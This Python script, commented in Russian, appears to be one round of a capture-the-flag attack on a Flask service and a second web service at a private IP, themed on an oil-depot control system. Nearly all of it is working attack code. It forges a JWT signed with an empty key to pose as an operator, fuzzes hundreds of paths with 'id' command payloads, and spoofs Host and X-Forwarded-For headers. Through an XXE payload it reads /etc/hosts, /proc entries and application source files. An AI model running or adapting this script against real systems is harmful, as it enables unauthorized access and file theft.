#!/usr/bin/env python3
"""round51 — Deep enumeration of port 9000 Flask service"""
import requests, socket, time, json, hmac as hm, hashlib, base64

HOST = "192.168.242.102"
PORT = 9000
TARGET = f"http://{HOST}:{PORT}"
CASPI = f"http://{HOST}:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

# ============================================================
print("="*70)
print("PHASE 1: /healthz — ДЕТАЛЬНОЕ ИССЛЕДОВАНИЕ")
print("="*70)

# Все HTTP методы на /healthz
for method in ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]:
    try:
        r = S.request(method, f"{TARGET}/healthz", timeout=5)
        print(f"  {method:8s} /healthz [{r.status_code}] H={dict(r.headers)} B={r.text[:100]}")
    except Exception as e:
        print(f"  {method:8s} /healthz ERR: {str(e)[:100]}")

# /healthz с query params
for qs in ["?verbose=1", "?debug=1", "?format=json", "?details=true"]:
    try:
        r = S.get(f"{TARGET}/healthz{qs}", timeout=3)
        if r.text != "ok":
            print(f"  GET /healthz{qs} [{r.status_code}]: {r.text[:200]}")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: МАССОВЫЙ ENDPOINT FUZZING")
print("="*70)

# Огромный список путей для Flask app
paths = [
    # Standard
    "/health", "/healthz", "/ready", "/readyz", "/livez",
    "/status", "/ping", "/version", "/info",

    # Shell/LLEHS themed
    "/shell", "/llehs", "/exec", "/execute", "/run", "/cmd",
    "/command", "/terminal", "/pty", "/console", "/bash", "/sh",
    "/rce", "/eval", "/interpret", "/process",
    "/api/shell", "/api/llehs", "/api/exec", "/api/execute",
    "/api/run", "/api/cmd", "/api/command", "/api/eval",
    "/api/v1/shell", "/api/v1/exec", "/api/v1/run",
    "/api/v1/cmd", "/api/v1/command",

    # Probe themed
    "/probe", "/api/probe", "/api/v1/probe",
    "/probe/sign", "/probe/verify", "/probe/secret",
    "/api/probe/sign", "/api/probe/verify", "/api/probe/secret",
    "/sign", "/verify", "/secret", "/key",

    # API
    "/api", "/api/", "/api/v1", "/api/v1/",
    "/api/v2", "/api/v2/",
    "/api/config", "/api/settings", "/api/secrets",
    "/api/auth", "/api/auth/login", "/api/auth/me",
    "/api/ops", "/api/ops/probe", "/api/ops/probe/sign",

    # Flask
    "/static", "/static/", "/favicon.ico",
    "/login", "/register", "/admin", "/dashboard",
    "/docs", "/swagger", "/openapi.json",

    # CTF
    "/flag", "/flag.txt", "/challenge", "/submit",
    "/ctf", "/score", "/hint",

    # Internal
    "/internal", "/internal/", "/debug",
    "/metrics", "/prometheus",
    "/config", "/env", "/environ",

    # gauge-gw
    "/gauge", "/meter", "/tank", "/level", "/flow",
    "/devices", "/device",
    "/v1/devices", "/v1/gauge", "/v1/config",

    # Oil/Gas/SCADA
    "/scada", "/modbus", "/opcua", "/dnp3",
    "/alarm", "/alarms", "/event", "/events",
    "/sensor", "/sensors", "/data", "/telemetry",
    "/custody", "/ingest", "/transfer",

    # Misc
    "/robots.txt", "/sitemap.xml", "/.env",
    "/test", "/debug", "/dump",
    "/ws", "/socket", "/connect",
    "/token", "/jwt", "/auth",
    "/upload", "/download", "/file",
    "/user", "/users", "/account",
    "/log", "/logs", "/audit",
    "/backup", "/export", "/import",

    # Reversed words (LLEHS = SHELL)
    "/nimdA",  # Admin
    "/gifnoc",  # config
    "/terces",  # secret
    "/yxorp",  # proxy
    "/eborp",  # probe
    "/ngis",  # sign
    "/galf",  # flag
    "/toor",  # root
]

found = []
for path in paths:
    try:
        r = S.get(f"{TARGET}{path}", timeout=2)
        if r.status_code != 404:
            found.append((path, r.status_code, r.text[:200]))
            print(f"  [{r.status_code}] GET {path}: {r.text[:150]}")
    except requests.exceptions.ConnectionError:
        pass
    except Exception as e:
        if "timed out" not in str(e):
            print(f"  [ERR] GET {path}: {str(e)[:80]}")

print(f"\n  Найдено не-404 путей: {len(found)}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: POST С РАЗНЫМИ Content-Type")
print("="*70)

# POST на каждый найденный endpoint + стандартные
post_paths = ["/healthz"] + [p for p, _, _ in found] + [
    "/", "/api", "/shell", "/llehs", "/exec", "/eval",
    "/probe", "/sign", "/command", "/run", "/cmd",
]
post_paths = list(set(post_paths))

for path in sorted(post_paths):
    for ct, data in [
        ("application/json", '{"cmd":"id"}'),
        ("application/x-www-form-urlencoded", "cmd=id"),
        ("text/plain", "id"),
        ("application/xml", "<cmd>id</cmd>"),
    ]:
        try:
            r = S.post(f"{TARGET}{path}", data=data,
                      headers={"Content-Type": ct, **AUTH_OP}, timeout=3)
            if r.status_code != 404:
                print(f"  [{r.status_code}] POST {path} [{ct}]: {r.text[:150]}")
                break  # Found something, don't need other content types
        except requests.exceptions.ConnectionError:
            # ConnectionReset = might exist but rejects this format
            pass
        except Exception as e:
            if "timed out" not in str(e) and "ConnectionReset" not in str(e):
                print(f"  [ERR] POST {path} [{ct}]: {str(e)[:80]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: VHOST / HOST HEADER TESTING")
print("="*70)

# Может сервис на порту 9000 роутит по Host header?
vhosts = [
    "llehs.internal", "shell.internal", "probe.internal",
    "gauge-gw.internal", "admin.internal", "api.internal",
    "caspi.internal", "scada.internal", "terminal.internal",
    "localhost", "127.0.0.1", HOST,
    "llehs", "shell", "probe", "gauge-gw",
    "khs-oil-depot", "oil-depot",
]

for vhost in vhosts:
    try:
        r = S.get(f"{TARGET}/", headers={"Host": vhost}, timeout=3)
        if r.status_code != 404:
            print(f"  Host: {vhost} -> [{r.status_code}] {r.text[:150]}")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: CUSTOM HEADERS")
print("="*70)

# Может нужен специальный заголовок?
custom_headers = [
    {"X-API-Key": "probe_secret"},
    {"X-Token": "probe_secret"},
    {"X-Auth": "operator"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Internal": "true"},
    {"X-Debug": "1"},
    {"X-Probe-Secret": "test"},
    AUTH_OP,
]

for headers in custom_headers:
    try:
        r = S.get(f"{TARGET}/", headers=headers, timeout=3)
        if r.status_code != 404:
            hdr_str = str(headers)[:60]
            print(f"  [{r.status_code}] / with {hdr_str}: {r.text[:150]}")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: PROBE SIGNED URL — SSRF ЧЕРЕЗ PROBE К ПОРТУ 9000?")
print("="*70)

# На CaspiTerminal, probe endpoint делает HTTP GET к подписанному URL.
# Если мы можем подписать URL вида http://localhost:9000/..., мы получим
# SSRF к порту 9000 изнутри Docker сети!
# Но для этого нужен PROBE_SECRET... или нет?

# Подождём — probe POST endpoint принимает url+sig.
# Мы знаем 5 валидных пар. Что если URL к gauge-gw проходит через этот же хост?
# Нет — gauge-gw.internal:9100 это отдельный контейнер.

# А что если мы попробуем запросить probe/sign с device, указывающим на 9000?
# Нет — device lookup is hardcoded dict, only 5 devices.

# IDEA: Может probe POST не проверяет URL строго и мы можем поменять порт/хост?
# Мы уже тестировали — strict exact match.

# Давайте проверим: может ли мы через XXE прочитать localhost:9000/healthz?
# lxml блокирует ALL HTTP — нет.

print("  SSRF через probe невозможен (нужен PROBE_SECRET для подписи)")
print("  XXE HTTP blocked (lxml no_network)")
print("  Ищем другой путь...")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: DIRECTORY BRUTE — ГЛУБЖЕ")
print("="*70)

# Wordlist для второго уровня путей на найденных первых уровнях
base_paths = ["/healthz"]

# Может есть /healthz/config, /healthz/debug?
for base in base_paths:
    for suffix in ["/config", "/debug", "/verbose", "/details", "/full",
                   "/status", "/env", "/info", "/version"]:
        try:
            r = S.get(f"{TARGET}{base}{suffix}", timeout=2)
            if r.status_code != 404:
                print(f"  [{r.status_code}] {base}{suffix}: {r.text[:150]}")
        except:
            pass

# Может эндпоинты под другим префиксом
prefixes = ["/api/v1", "/api/v2", "/v1", "/v2", "/internal", "/admin",
            "/ops", "/mgmt", "/management", "/system", "/_"]

for prefix in prefixes:
    for endpoint in ["/healthz", "/health", "/status", "/config",
                     "/probe", "/shell", "/exec", "/secret",
                     "/sign", "/verify", "/devices", "/key"]:
        try:
            r = S.get(f"{TARGET}{prefix}{endpoint}", timeout=2)
            if r.status_code != 404:
                print(f"  [{r.status_code}] {prefix}{endpoint}: {r.text[:150]}")
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: XXE — ЧИТАЕМ ФАЙЛЫ ВТОРОГО ПРИЛОЖЕНИЯ")
print("="*70)

# Порт 9000 — отдельное приложение. Может быть в другой директории?
# Docker compose: порт 9000 mapped to host
# Приложение может быть в другом контейнере, но мы читаем файлы
# контейнера CaspiTerminal (порт 8007/3000)

# А что если это ТОТ ЖЕ контейнер? gunicorn может запускать
# второе приложение! Проверим entrypoint.sh

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:500]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

# Порт 9000 — другой Docker контейнер. Мы не можем читать его файлы через XXE.
# НО: мы можем проверить, нет ли доп. файлов в контейнере CaspiTerminal

# Ищем Python файлы в /app/ которые могли быть пропущены
app_files = [
    "/app/shell.py", "/app/llehs.py", "/app/probe_secret.py",
    "/app/internal.py", "/app/admin.py", "/app/api.py",
    "/app/health.py", "/app/healthz.py",
    "/app/server.py", "/app/service.py",
    "/app/gateway.py", "/app/proxy.py",
    "/app/gauge.py", "/app/meter.py",
    "/app/sign.py", "/app/verify.py",
    "/app/hmac_utils.py", "/app/crypto.py",
    "/app/secret.py", "/app/secrets.py",
    # Может приложение в подкаталоге
    "/app/src/app.py", "/app/src/main.py",
    "/app/llehs/app.py", "/app/shell/app.py",
    "/app/probe/app.py",
    "/opt/app/app.py", "/opt/llehs/app.py",
    "/srv/app.py", "/srv/llehs/app.py",
    # Конфиг gunicorn для второго приложения
    "/app/gunicorn2.conf.py", "/app/gunicorn_llehs.conf.py",
    # Supervisor для запуска нескольких процессов
    "/etc/supervisor/supervisord.conf",
    "/etc/supervisor/conf.d/llehs.conf",
    "/etc/supervisor/conf.d/shell.conf",
    "/etc/supervisor/conf.d/app.conf",
    "/etc/supervisor/conf.d/probe.conf",
]

for f in app_files:
    st, val = xxe_read(f)
    if st == "OK" and val:
        print(f"  [READ] {f}:")
        print(f"    {val[:400]}")
    elif st == "BIN":
        print(f"  [BIN]  {f}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: PROBE SIGN — ДОП ПРОВЕРКИ")
print("="*70)

# Проверим /api/ops/probe/sign с разными параметрами
# Может есть скрытый параметр для получения secret?
test_params = [
    {"device": "lm-01", "debug": "1"},
    {"device": "lm-01", "verbose": "true"},
    {"device": "lm-01", "include_secret": "1"},
    {"device": "lm-01", "format": "full"},
    {"device": "lm-01", "show_key": "1"},
    {"secret": "1"},
    {"key": "1"},
    {"action": "get_secret"},
    {"action": "list_keys"},
]

for params in test_params:
    try:
        r = S.get(f"{CASPI}/api/ops/probe/sign", params=params,
                  headers=AUTH_OP, timeout=5)
        data = r.json() if r.status_code == 200 else r.text[:200]
        p_str = "&".join(f"{k}={v}" for k,v in params.items())
        # Only show if response differs from standard
        if r.status_code == 200:
            keys = list(data.keys()) if isinstance(data, dict) else "N/A"
            if len(keys) > 2 or keys != ['sig', 'url']:
                print(f"  [{r.status_code}] ?{p_str}: keys={keys} | {data}")
        else:
            print(f"  [{r.status_code}] ?{p_str}: {data[:150]}")
    except Exception as e:
        print(f"  [ERR] ?{str(params)[:40]}: {str(e)[:80]}")

# POST to sign endpoint
try:
    r = S.post(f"{CASPI}/api/ops/probe/sign",
               json={"device": "lm-01"}, headers=AUTH_OP, timeout=5)
    print(f"\n  POST /api/ops/probe/sign [{r.status_code}]: {r.text[:200]}")
except Exception as e:
    print(f"  POST /api/ops/probe/sign: {str(e)[:100]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 10: DOCKER COMPOSE / СЕТЕВЫЕ КОНФИГИ")
print("="*70)

# Читаем /proc/net/tcp ещё раз — может сервис на 9000 запускается
# из этого же контейнера (двойной gunicorn)?
# Мы видели только 0.0.0.0:3000 в LISTEN — значит 9000 НЕ в этом контейнере

# Проверим /etc/hosts — может есть записи для других сервисов
st, val = xxe_read("/etc/hosts")
if st == "OK":
    print(f"  /etc/hosts:\n{val}")

# /proc/1/cmdline через directory listing hack
st, val = xxe_read("/proc/1/cmdline")
if st == "OK":
    print(f"  /proc/1/cmdline: {val}")
elif st == "BIN":
    print(f"  /proc/1/cmdline: BIN (null bytes)")

# Проверим mounts для подсказки о втором контейнере
st, val = xxe_read("/proc/self/cgroup")
if st == "OK":
    print(f"\n  /proc/self/cgroup:\n{val[:500]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 11: GOBUSTER-STYLE — ЧИСЛОВЫЕ И ХЕШИ")
print("="*70)

# Может endpoint — это хеш или UUID?
import hashlib as hl

# CTF часто использует хеш-based пути
test_hashes = [
    hl.md5(b"shell").hexdigest(),
    hl.md5(b"llehs").hexdigest(),
    hl.md5(b"probe").hexdigest(),
    hl.md5(b"secret").hexdigest(),
    hl.md5(b"flag").hexdigest(),
    hl.md5(b"admin").hexdigest(),
    hl.sha256(b"shell").hexdigest()[:16],
    hl.sha256(b"llehs").hexdigest()[:16],
]

for h in test_hashes:
    try:
        r = S.get(f"{TARGET}/{h}", timeout=2)
        if r.status_code != 404:
            print(f"  [{r.status_code}] /{h}: {r.text[:100]}")
    except:
        pass

print("\n"+"="*70)
print("DONE")
print("="*70)
